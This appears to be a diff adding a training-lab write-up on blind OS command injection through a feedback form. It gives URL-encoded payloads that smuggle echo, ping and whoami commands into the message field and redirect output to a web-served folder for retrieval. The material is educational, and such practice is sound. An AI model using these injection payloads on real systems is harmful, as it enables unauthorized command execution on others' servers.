@@ -1,0 +1,28 @@
+Lab: Blind OS command injection with output redirection
+
+Vulnerability: 
++ This lab contains a blind OS command injection vulnerability in the feedback function.
++ The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at: /var/www/images/
++ The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
+
+Goal: To solve the lab, execute the whoami command and retrieve the output.
+
+Analysis:
+1. Send a feedback and analyse the request.
+
+2. Check whether this website is vulnerable to OS command injection
+=> Change message parameter to: "+%26+echo+sondeptrai+%26+"
+=> Does not containt sondeptrai in the response
+
+3. Check whether this website is vulnerable to Blind OS command injection
+=> Change message parameter to: "+%26+ping+-c+10+127.0.0.1+%26+"
+=> See the response after amount of time
+=> It is vulnerable to Blind OS command injection
+
+Solution:
+1. Exploit Blind OS command injection with output redirection
+=> redirect the ouput of whoami command into a file of /var/www/images/ folder
+=> using input: "+%26+whoami+>+/var/www/images/whoami.txt+%26+"
+
+2. Retrieve the content of whoami.txt file using URL: /image?filename=whoami.txt
+=> user: peter-XyvuMX
